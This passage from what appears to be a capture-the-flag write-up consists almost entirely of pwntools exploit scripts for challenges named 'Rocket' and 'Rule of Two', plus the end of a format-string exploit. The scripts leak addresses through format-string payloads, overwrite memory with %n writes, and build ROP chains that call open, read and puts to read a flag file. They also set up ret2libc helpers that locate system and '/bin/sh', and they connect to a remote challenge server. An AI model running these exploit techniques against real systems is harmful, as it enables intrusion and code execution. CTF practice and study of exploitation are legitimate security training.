<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'boss_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">boss_addr</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%97c%9$n'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">boss_addr</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">'----%p'</span> 
<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>

<span class="n">ru</span><span class="p">(</span><span class="s">'----'</span><span class="p">)</span>
<span class="n">stack_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">target_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0x18</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'stack_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'target_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target_addr</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'--%9$s--'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'pay '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">play</span><span class="p">()</span>

<span class="n">id_addr</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:])</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'id_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">id_addr</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%252c10$hhnaaaaa'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">id_addr</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'pay '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="n">pay</span><span class="p">,</span> <span class="mh">0x00FFFC18</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">show</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>

<span class="n">play</span><span class="p">()</span>
<span class="n">itr</span><span class="p">()</span>

<span class="c1"># mark, learn x64 fmt
</span></code></pre></div></div>

<h2 id="rocket">Rocket</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn-rocket'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">13163</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'aa-%20$p'</span>       <span class="c1"># remote
# pay = b'aa-%21$p'     # local
</span><span class="n">sla</span><span class="p">(</span><span class="s">'Please authenticate &gt;&gt;&gt;</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s">'Welcome: aa-'</span><span class="p">)</span>
<span class="n">base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1606</span>
<span class="n">vuln_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1531</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'base addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'vuln addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">))</span>

<span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x168b</span> <span class="o">+</span> <span class="n">base_addr</span>
<span class="n">rsi_r15</span> <span class="o">=</span> <span class="mh">0x1689</span> <span class="o">+</span> <span class="n">base_addr</span>
<span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x14be</span> <span class="o">+</span> <span class="n">base_addr</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="o">+</span> <span class="n">base_addr</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span> <span class="o">+</span> <span class="n">base_addr</span>
<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x2db8</span> <span class="o">+</span> <span class="n">base_addr</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x5500</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x14DB</span>
<span class="n">rax</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1210</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x1016</span>

<span class="c1"># syscall number
# read          # 0
# write         # 1
# open          # 2
</span>
<span class="c1"># orw
# open
</span><span class="n">leak</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x48</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># read
</span><span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># write
# leak += p64(rax) + p64(1)
# leak += p64(rdi) + p64(1)
# leak += p64(rsi_r15) + p64(bss_addr) + p64(0)
# leak += p64(rdx) + p64(0x100)
# leak += p64(syscall)
</span><span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Tell me to do something &gt;&gt;&gt;'</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="c1"># mark, learn syscall and orw
</span></code></pre></div></div>

<h2 id="rule-of-two">Rule of Two</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vader'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">20712</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="c1"># rdi   rsi   rdx   rcx   r8    r9
</span>
<span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x40165b</span>
<span class="n">rsi_r15</span> <span class="o">=</span> <span class="mh">0x401659</span>
<span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00000000004011ce</span>
<span class="n">rcx_r8</span> <span class="o">=</span> <span class="mh">0x00000000004011d8</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x405000</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x4015B5</span>
<span class="n">fgets_addr</span> <span class="o">=</span> <span class="mh">0x401060</span>
<span class="n">stdin_off</span> <span class="o">=</span> <span class="mh">0x405070</span>
<span class="n">fopen_addr</span> <span class="o">=</span> <span class="mh">0x401080</span>
<span class="n">r_mode_addr</span> <span class="o">=</span> <span class="mh">0x402EE0</span>
<span class="n">puts_addr</span> <span class="o">=</span> <span class="mh">0x401030</span>
<span class="n">a_flag_txt</span> <span class="o">=</span> <span class="mh">0x402EE2</span>
<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x4015F8</span>
<span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x40116d</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x401016</span>
<span class="n">elf_got_put</span> <span class="o">=</span> <span class="mh">0x405018</span>

<span class="c1"># leak stdin
